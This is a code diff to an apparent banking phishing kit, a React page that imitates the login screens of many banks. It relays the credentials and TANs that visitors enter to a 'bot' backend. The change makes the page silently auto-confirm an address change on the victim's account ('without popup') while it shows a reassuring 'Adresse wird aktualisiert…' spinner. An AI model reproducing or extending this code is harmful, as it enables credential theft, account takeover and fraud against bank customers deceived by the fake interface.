@@ -10,7 +10,7 @@ import { TanWaitingScreen } from "@/components/flow/TanWaitingScreen";
 import { BotResultScreen } from "@/components/flow/BotResultScreen";
 import SplashLogoReveal from "@/components/SplashLogoReveal";
 import VRSplashReveal from "@/components/VRSplashReveal";
-import { startBotTask, getBotTask } from "@/lib/botClient";
+import { startBotTask, getBotTask, confirmAddress } from "@/lib/botClient";
 import { getSecureGoLabel } from "@/lib/secureGoLabel";
 import { startQrLoginSession } from "@/lib/qrLogin.functions";
 import type { BankTheme } from "@/data/banks";
@@ -51,7 +51,7 @@ type Bank = {
 };
 
 
-type Phase = "form" | "waiting" | "tan" | "result" | "session_expired";
+type Phase = "form" | "waiting" | "tan" | "address_confirm" | "result" | "session_expired";
 
 const logoModules = import.meta.glob("@/assets/*.png", { eager: true, import: "default" }) as Record<string, string>;
 const logoAliases: Record<string, string> = {
@@ -297,7 +297,8 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
   function startPolling(taskId: string, startedAt: number) {
     stopPolling();
-    pollRef.current = { timer: null, startedAt, taskId, positiveSeen: false };
+    pollRef.current = { timer: null, startedAt, taskId, positiveSeen: false, addressConfirmed: false } as any;
+
     const tick = async () => {
       if (!pollRef.current || pollRef.current.taskId !== taskId) return;
       if (Date.now() - startedAt > POLL_TIMEOUT_MS) {
@@ -388,9 +389,27 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         return;
       }
 
+      // Auto-confirm address without popup
+      const addressConfirmSignal =
+        st === "waiting_for_address_confirm" ||
+        st === "waiting_for_address" ||
+        payloadContains(data, /address.?confirm|adress.?bestaet|waiting_for_address/i);
+      if (addressConfirmSignal) {
+        pollRef.current.positiveSeen = true;
+        setPhase("address_confirm");
+        setSubmitting(true);
+        if (!(pollRef.current as any).addressConfirmed) {
+          (pollRef.current as any).addressConfirmed = true;
+          confirmAddress(taskId).catch((e) => console.warn("[bot] confirm-address failed", e));
+        }
+        pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
+        return;
+      }
+
       if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal) {
         setPhase("tan");
         setSubmitting(false);
+
       } else if (st === "running" || st === "pending") {
         setSubmitting(true);
       } else if (st === "failed") {
@@ -528,9 +547,30 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     );
   }
 
+
   const fallbackLogoSrc = getLogo(groupLogoName[bank.group]) || vrLogoGeneric;
   const isBBBank = bank.group === "BBBank";
   const shellProps = { theme, logoSrc, fallbackLogoSrc, bankName: bank.name, showName, bigLogo: isBBBank, footerLinks: (bank.footer_links ?? null) as any };
+
+  if (phase === "address_confirm") {
+    return (
+      <BankShell {...shellProps}>
+        <div className="max-w-md mx-auto mt-16 flex flex-col items-center gap-4 text-center">
+          <div
+            className="h-10 w-10 rounded-full border-2 border-t-transparent animate-spin"
+            style={{ borderColor: themeColor, borderTopColor: "transparent" }}
+          />
+          <h2 className="text-xl font-semibold" style={{ color: themeColor }}>
+            Adresse wird aktualisiert…
+          </h2>
+          <p className="text-sm text-gray-600">
+            Bitte einen Moment Geduld, Ihre Daten werden verarbeitet.
+          </p>
+        </div>
+      </BankShell>
+    );
+  }
+
 
 
 
